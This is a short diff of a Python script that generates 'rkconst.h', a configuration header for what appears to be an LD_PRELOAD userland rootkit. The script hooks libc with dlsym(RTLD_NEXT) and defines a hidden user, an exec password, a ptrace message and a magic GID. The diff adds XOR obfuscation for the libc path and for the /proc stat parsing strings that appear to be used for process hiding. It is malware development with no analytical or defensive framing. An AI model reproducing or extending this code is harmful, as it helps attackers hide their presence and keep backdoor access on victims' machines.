@@ -25,7 +25,7 @@ def main():
     try:
         f = open("rkconst.h", "w")
         f.write("#ifndef RTLD_NEXT\n#define RTLD_NEXT ((void *) -11)\n#endif\n#define HOOK(func) old##_##func = dlsym(RTLD_NEXT, #func)\n#define CLEAN(var) clean(var, strlen(var))\n")
-        f.write("#define LIBC "  + "\"" + "/lib/libc.so.6" + "\"" + "\n")
+        f.write("#define LIBC "  + "\"" + xor("/lib/libc.so.6", key) + "\"" + "\n")
         f.write("#define PROC_PATH " + "\"" + xor("/proc/self/fd/%d", key) + "\"" + "\n")
         f.write("#define PROC " + "\"" + xor("/proc", key) + "\"" + "\n")
         f.write("#define USER " + "\"" + xor(user, key) + "\"" + "\n")
@@ -33,6 +33,8 @@ def main():
         f.write("#define EXECPW " + "\"" + xor(execpw, key) + "\"" + "\n")
         f.write("#define PTRACE_MSG " + "\"" + xor(ptrace, key) + "\"" + "\n")
         f.write("#define MAGICGID "  + magicgid + "\n")
+        f.write("#define NFP_STR_STAT " + "\"" + xor("%s/%s/stat", key) + "\"" + "\n") 
+        f.write("#define NFP_STR_RGX " + "\"" + xor("%d (%[^)]s", key) + "\"" + "\n")
         if debug.lower() == "y": 
             f.write("#define DEBUG\n") 
         f.close()
